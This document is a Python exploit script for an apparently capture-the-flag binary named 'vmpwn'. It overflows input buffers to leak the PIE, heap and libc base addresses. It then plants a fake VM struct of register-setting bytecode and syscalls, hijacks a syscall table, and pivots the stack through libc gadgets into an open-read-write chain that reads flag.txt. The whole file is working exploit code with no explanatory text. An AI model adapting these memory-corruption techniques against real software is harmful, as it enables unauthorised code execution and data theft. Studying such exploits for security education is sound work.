#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./vmpwn')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 1337)

gdbscript = '''
'''.format(**locals())

libc=SetupLibcELF()
io = start()

def get_pie():
	sa(b"#tell me what is your name:", b"A"*255 + b"\xff" + b"\x18")
	reu(b"\xff")
	exe.address=uuu64(ren(6))-0x203818
	info(f"PIE BASE := {hex(exe.address)}")
	sa(b"ok,what do you want to say:", b"A"*256+p(exe.address+0x203020)+p(0xdeadbeef))

def get_heap():
	sa(b"#tell me what is your name:", b"\xff"*0x10)
	ren(0xf0)
	heap_base=uuu64(ren(6))-0x50
	info(f"HEAP BASE := {hex(heap_base)}")
	sa(b"ok,what do you want to say:", b"A"*256+p(exe.address+0x203020)+p(0xdeadbeef))
	return heap_base

def set_rdi(rdi):
	return b"\x11"+p(rdi)

def set_rsi(rsi):
	return b"\x12"+p(rsi)

def set_rdx(rdx):
	return b"\x13"+p(rdx)

def syscall(rax):
	return b"\x8f" + chr(rax).encode("latin-1")

get_pie()
heap_base=get_heap()
fake_vm_struct_addr = heap_base+0x2e70
sa(b"#tell me what is your name:", cyclic(1024) + p(0xcafebebe))
reu(b"ok,what do you want to say:")

pause()

FLAG_ADDR = heap_base+0x2e5f
ORW_ADDRESS = heap_base+0x50
SYSCALL_TABLE = exe.address+0x2038e0

fake_vm_struct=set_rdi(1) + set_rsi(exe.got['read']) + set_rdx(0x10) + syscall(1) + set_rdi(0) + set_rsi(ORW_ADDRESS) + set_rdx(0x1337) + syscall(0) + set_rsi(SYSCALL_TABLE) + syscall(0) + set_rdx(gadget("ret")) + set_rdi(ORW_ADDRESS) + syscall(2) + syscall(1)

s(b"X"*247 + b"flag.txt\x00" + p(fake_vm_struct_addr) + p(fake_vm_struct))
rl()

libc.address = uu64(ren(6))-libc.sym['read']
MOV_R8_RDI_JMP_RDX = libc.address+0x000000000ff386
MOV_RSP_R8 = libc.address+0x000000000352f9

lb()
re()
pause()
s(ORW(FLAG_ADDR))
pause()
s(p(libc.sym['read'])+p(MOV_RSP_R8)+p(MOV_R8_RDI_JMP_RDX))
info(rl())
re()
io.interactive()